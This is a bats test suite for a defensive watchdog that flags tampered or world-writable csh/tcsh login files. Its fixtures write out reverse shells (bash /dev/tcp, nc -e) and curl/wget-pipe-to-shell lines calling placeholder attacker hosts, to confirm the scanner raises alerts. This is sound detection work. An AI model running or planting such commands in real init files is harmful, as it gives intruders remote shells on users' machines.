#!/usr/bin/env bats
# L2 bats functional tests for the csh-config-watchdog scan script.
#
# The system csh/tcsh init files (/etc/csh.cshrc, /etc/csh.login,
# /etc/csh.logout) are SOURCED for every csh/tcsh login — a per-login exec
# surface (T1546). A file that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-csh-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/csh-config-watchdog/systemd/csh-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CSHRC="${TMP}/csh.cshrc"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_CSH_PROFILE="${PROFILE:-report}" \
    SELFDEF_CSH_BASELINE="${BASELINE}" \
    SELFDEF_CSH_FILES="${FILES_V:-$CSHRC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# csh.cshrc\nsetenv PATH /usr/bin:/bin\numask 022\n' > "${CSHRC}"
}

@test "no csh config → ok / no_csh_config" {
    FILES_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_csh_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign csh config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged csh config on second run → ok / csh_config_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"csh_config_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in csh config → alert / csh_config_suspicious" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"csh_config_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable csh config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign csh config change → warn / csh_config_changed" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nsetenv PATH /usr/bin:/bin:/usr/local/bin\numask 027\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"csh_config_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned csh config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious csh config" {
    seed_benign
    run_wd
    printf '# csh.cshrc\ncurl http://evil/p|sh\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — csh config inventory enumerates per-login source surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in csh config → alert" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in csh config → alert" {
    seed_benign
    run_wd
    printf '# csh.cshrc\nwget -qO- http://attacker/p | sh\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in csh config → alert" {
    seed_benign
    run_wd
    printf '# csh.cshrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable csh config): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable csh config): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${CSHRC}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-csh-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): csh-config-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # csh-config injection patterns are NEVER routine; the alert
    # must persist across runs until operator explicitly re-
    # baselines.
    seed_benign
    run_wd
    printf '# csh.cshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"csh_config_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # csh config uses # as comment marker. Operator notes about
    # hypothetical attack patterns must not surface as real
    # injection.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh.cshrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nsetenv PATH /usr/bin:/bin\n' > "${CSHRC}"
    run_wd
    ! cap | grep -q '"event":"csh_config_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-sh injection family — bash subshell variant — also detected)" {
    # curl http://... | bash variant.
    seed_benign
    run_wd
    printf '# csh.cshrc\ncurl -s http://attacker.com/payload.sh | bash\n' > "${CSHRC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: csh.login axis also scanned, not only csh.cshrc — full per-login surface)" {
    # /etc/csh.login is sourced for LOGIN shells specifically.
    # Attackers may target it directly. Watchdog must walk all
    # three files (csh.cshrc + csh.login + csh.logout).
    CSHLOGIN="${TMP}/csh.login"
    seed_benign
    FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in csh.login.
    printf '# csh.login\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CSHLOGIN}"
    FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (csh.logout axis — third per-login file — also scanned)" {
    # /etc/csh.logout is sourced at logout time — a per-session
    # exec surface. Sister axis to csh.cshrc + csh.login.
    CSHLOGOUT="${TMP}/csh.logout"
    seed_benign
    FILES_V="${CSHRC} ${CSHLOGOUT}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh.logout\nwget -qO- http://attacker/p | sh\n' > "${CSHLOGOUT}"
    FILES_V="${CSHRC} ${CSHLOGOUT}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in csh config: netcat-listening pipe also detected)" {
    # Sister to sshrc-watchdog nc reverse-shell variant INVARIANT.
    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are
    # a canonical RCE primitive. Lock detection alongside the
    # bash /dev/tcp variant.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# csh.cshrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${CSHRC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (sample names offending file in JSON — operator triage routing)" {
    # When injection-pattern alert fires, sample MUST surface the
    # file path so operator dashboard routes triage to the right
    # path. Sister contract: sshrc/polkit-rules/nfs-exports/rhosts/
    # tmpfiles/securetty sample-naming pattern.
    USER_CSHRC="${TMP}/user-distinctive-attacker.cshrc"
    seed_benign
    FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# user csh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USER_CSHRC}"
    FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
    cap | grep -q 'user-distinctive-attacker'
}
